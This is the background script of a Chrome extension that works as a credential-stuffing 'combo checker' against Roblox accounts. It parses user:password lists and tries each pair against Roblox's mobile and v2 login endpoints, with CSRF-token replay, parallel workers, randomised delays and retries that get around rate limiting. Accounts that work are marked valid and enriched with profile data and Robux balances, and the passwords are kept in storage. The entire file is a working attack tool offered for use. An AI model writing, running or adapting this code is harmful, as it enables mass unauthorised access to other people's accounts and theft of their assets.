'use strict';

const DEF = { concurrency: 5, delay: 150, retries: 2, timeout: 25000, enrich: true, robux: false };

let job = null;
let running = false;
let paused = false;
let cursor = 0;
let active = 0;
let savedCookie = null;
let saveTimer = null;

const uid = () => Math.random().toString(36).slice(2, 10);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function freshStats() {
  return { total: 0, checked: 0, valid: 0, invalid: 0, twofa: 0, captcha: 0, error: 0, ratelimit: 0 };
}

/* ---------------- persistence ---------------- */
function save() {
  clearTimeout(saveTimer);
  saveTimer = setTimeout(() => {
    if (!job) return;
    chrome.storage.local.set({ job, cursor, savedCookie });
  }, 500);
}

async function load() {
  const d = await chrome.storage.local.get(['job', 'cursor', 'savedCookie']);
  if (d.job && !d.job.done) {
    job = d.job;
    cursor = d.cursor || 0;
    savedCookie = d.savedCookie || null;
  }
}

/* ---------------- combo parsing ---------------- */
function parseCombos(lines) {
  const seen = new Set();
  const out = [];
  for (const raw of lines) {
    const line = String(raw).trim();
    if (!line || line.startsWith('#')) continue;
    const i = line.indexOf(':');
    let user = i === -1 ? line : line.slice(0, i).trim();
    const pass = i === -1 ? '' : line.slice(i + 1).trim();
    user = user.replace(/^@/, '');
    if (!user || !pass) continue;
    const key = (user + ':' + pass).toLowerCase();
    if (seen.has(key)) continue;
    seen.add(key);
    out.push({ id: uid(), user, pass, status: 'pending', note: '', tries: 0 });
  }
  return out;
}

/* ---------------- cookie session save/restore ---------------- */
async function getCookie() {
  try {
    const c = await chrome.cookies.get({ url: 'https://www.roblox.com', name: '.ROBLOSECURITY' });
    return c ? c.value : null;
  } catch { return null; }
}

async function restoreCookie() {
  if (!savedCookie) return;
  try {
    await chrome.cookies.set({
      url: 'https://www.roblox.com',
      name: '.ROBLOSECURITY',
      value: savedCookie,
      domain: '.roblox.com',
      path: '/',
      secure: true,
      httpOnly: true
    });
  } catch {}
}

/* ---------------- network ---------------- */
async function timedFetch(url, init) {
  const ctl = new AbortController();
  const t = setTimeout(() => ctl.abort(), job ? job.settings.timeout : DEF.timeout);
  try {
    return await fetch(url, { ...init, signal: ctl.signal, cache: 'no-store' });
  } finally {
    clearTimeout(t);
  }
}

async function postWithCsrf(url, init) {
  let r = await timedFetch(url, init);
  if (r.status === 403) {
    const tok = r.headers.get('x-csrf-token');
    if (tok) {
      r = await timedFetch(url, { ...init, headers: { ...init.headers, 'x-csrf-token': tok } });
    }
  }
  return r;
}

function classify(status, text) {
  const t = (text || '').toLowerCase();

  if (status === 200) {
    try {
      const j = JSON.parse(text);
      const id = j.UserID || j.userId || (j.user && (j.user.id || j.user.userId));
      const nm = j.Username || j.username || (j.user && (j.user.name || j.user.username));
      if (id) return { status: 'valid', userId: id, name: nm };
      if (j.challenge && j.challenge.type) return { status: 'captcha', note: 'challenge' };
      return { status: 'valid', name: nm };
    } catch {
      return { status: 'valid' };
    }
  }

  if (status === 429) return { status: 'ratelimit', note: 'rate limited' };
  if (t.includes('two step') || t.includes('two-step') || t.includes('twostepverification')) {
    return { status: 'twofa', note: '2FA on account' };
  }
  if (t.includes('unverified email') || t.includes('verify your email')) {
    return { status: 'twofa', note: 'email verification' };
  }
  if (t.includes('incorrect username or password') || t.includes('user not found') || t.includes('invalid credentials')) {
    return { status: 'invalid' };
  }
  if (status === 400 || status === 401) return { status: 'invalid' };
  if (status === 403 || t.includes('captcha') || t.includes('challenge')) {
    return { status: 'captcha', note: 'captcha wall' };
  }
  if (status >= 500) return { status: 'error', note: 'server ' + status };
  return { status: 'error', note: 'http ' + status };
}

async function tryMobile(item) {
  const body = new URLSearchParams({ username: item.user, password: item.pass, ctype: 'Username' }).toString();
  const r = await postWithCsrf('https://www.roblox.com/mobileapi/login', {
    method: 'POST',
    credentials: 'omit',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Accept': 'application/json',
      'Origin': 'https://www.roblox.com',
      'Referer': 'https://www.roblox.com/'
    },
    body
  });
  const text = await r.text();
  return classify(r.status, text);
}

async function tryV2(item) {
  const r = await postWithCsrf('https://auth.roblox.com/v2/login', {
    method: 'POST',
    credentials: 'omit',
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json',
      'Origin': 'https://www.roblox.com',
      'Referer': 'https://www.roblox.com/'
    },
    body: JSON.stringify({ ctype: 'Username', cvalue: item.user, password: item.pass })
  });
  const text = await r.text();
  return classify(r.status, text);
}

async function attempt(item) {
  let a;
  try {
    a = await tryMobile(item);
  } catch (e) {
    a = { status: 'error', note: 'net' };
  }
  if (a.status === 'valid' || a.status === 'invalid' || a.status === 'twofa') return a;

  let b;
  try {
    b = await tryV2(item);
  } catch (e) {
    b = { status: 'error', note: 'net' };
  }
  if (b.status === 'valid' || b.status === 'invalid' || b.status === 'twofa') return b;
  return a.status === 'captcha' ? a : b;
}

/* ---------------- enrichment ---------------- */
async function enrich(item) {
  if (!item.userId) return;
  try {
    const r = await fetch('https://users.roblox.com/v1/users/' + item.userId, { cache: 'no-store' });
    if (r.ok) {
      const j = await r.json();
      item.name = j.name || item.name;
      item.display = j.displayName || '';
      item.created = (j.created || '').slice(0, 10);
    }
  } catch {}

  try {
    const r = await fetch(
      'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' + item.userId + '&size=150x150&format=Png&isCircular=true',
      { cache: 'no-store' }
    );
    if (r.ok) {
      const j = await r.json();
      const d = j.data && j.data[0];
      if (d && d.imageUrl) item.avatar = d.imageUrl;
    }
  } catch {}

  if (job && job.settings.robux && job.settings.concurrency === 1) {
    try {
      const r = await fetch('https://economy.roblox.com/v1/user/currency', { credentials: 'include', cache: 'no-store' });
      if (r.ok) {
        const j = await r.json();
        if (typeof j.robux === 'number') item.robux = j.robux;
      }
    } catch {}
  }
}

/* ---------------- item processing ---------------- */
async function checkOne(item) {
  if (item.status !== 'pending') return;
  item.status = 'checking';

  let res = null;
  for (let t = 0; t <= job.settings.retries; t++) {
    item.tries = t + 1;
    try {
      res = await attempt(item);
    } catch {
      res = { status: 'error', note: 'net' };
    }
    if (res.status !== 'error' && res.status !== 'ratelimit') break;
    await sleep(700 * (t + 1));
  }

  item.status = res.status;
  item.note = res.note || '';
  if (res.userId) item.userId = res.userId;
  if (res.name) item.name = res.name;
  item.checkedAt = Date.now();

  const s = job.stats;
  s.checked++;
  if (s[res.status] !== undefined) s[res.status]++;

  if (res.status === 'valid' && job.settings.enrich) {
    await enrich(item);
  }

  save();
}

/* ---------------- engine ---------------- */
async function worker() {
  while (job && running && !paused) {
    if (cursor >= job.items.length) break;
    const idx = cursor++;
    const item = job.items[idx];
    if (!item) continue;
    await checkOne(item);
    if (job.settings.delay) await sleep(job.settings.delay + Math.random() * job.settings.delay);
  }
  active--;
  if (active <= 0) {
    running = false;
    if (job && !paused && cursor >= job.items.length) await finish();
  }
}

function run() {
  if (!job || running || paused) return;
  const left = job.items.length - cursor;
  if (left <= 0) return;
  running = true;
  active = Math.min(job.settings.concurrency, left);
  for (let i = 0; i < active; i++) worker();
}

async function finish() {
  if (!job) return;
  job.done = true;
  job.endedAt = Date.now();
  running = false;
  save();
  await sleep(600);
  await restoreCookie();
}

/* ---------------- job control ---------------- */
async function startJob(lines, settings) {
  await stopJob(true);
  const items = parseCombos(lines || []);
  if (!items.length) return { ok: false, error: 'No valid combos parsed.' };

  savedCookie = await getCookie();
  job = {
    items,
    settings: { ...DEF, ...(settings || {}) },
    stats: freshStats(),
    startedAt: Date.now(),
    endedAt: 0,
    done: false
  };
  job.stats.total = items.length;
  cursor = 0;
  paused = false;
  running = false;
  active = 0;
  save();
  run();
  return { ok: true, total: items.length };
}

async function stopJob(silent) {
  const had = !!job;
  running = false;
  paused = false;
  if (job) job.done = true;
  if (had && !silent) {
    save();
    await restoreCookie();
  }
}

async function clearAll() {
  running = false;
  paused = false;
  job = null;
  cursor = 0;
  active = 0;
  savedCookie = null;
  await chrome.storage.local.remove(['job', 'cursor', 'savedCookie']);
}

function snapshot() {
  if (!job) return { job: null };
  const items = job.items.map((i) => ({
    id: i.id,
    user: i.user,
    pass: i.pass,
    status: i.status,
    note: i.note,
    name: i.name || '',
    display: i.display || '',
    created: i.created || '',
    avatar: i.avatar || '',
    robux: i.robux,
    userId: i.userId
  }));
  return {
    job: {
      items,
      stats: job.stats,
      settings: job.settings,
      startedAt: job.startedAt,
      endedAt: job.endedAt,
      done: job.done
    },
    running,
    paused,
    cursor
  };
}

/* ---------------- messaging ---------------- */
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  (async () => {
    try {
      switch (msg.type) {
        case 'start': sendResponse(await startJob(msg.combos, msg.settings)); break;
        case 'pause': paused = true; save(); sendResponse({ ok: true }); break;
        case 'resume': paused = false; run(); sendResponse({ ok: true }); break;
        case 'stop': await stopJob(false); sendResponse({ ok: true }); break;
        case 'clear': await clearAll(); sendResponse({ ok: true }); break;
        case 'get': sendResponse(snapshot()); break;
        default: sendResponse({ ok: false });
      }
    } catch (e) {
      sendResponse({ ok: false, error: String(e) });
    }
  })();
  return true;
});

chrome.action.onClicked.addListener(() => {
  chrome.tabs.create({ url: chrome.runtime.getURL('index.html') });
});

chrome.alarms.create('hb', { periodInMinutes: 0.5 });
chrome.alarms.onAlarm.addListener(async () => {
  if (!job) await load();
  if (job && !job.done && !paused && !running && cursor < job.items.length) run();
});

chrome.runtime.onStartup.addListener(load);
chrome.runtime.onInstalled.addListener(load);
load();
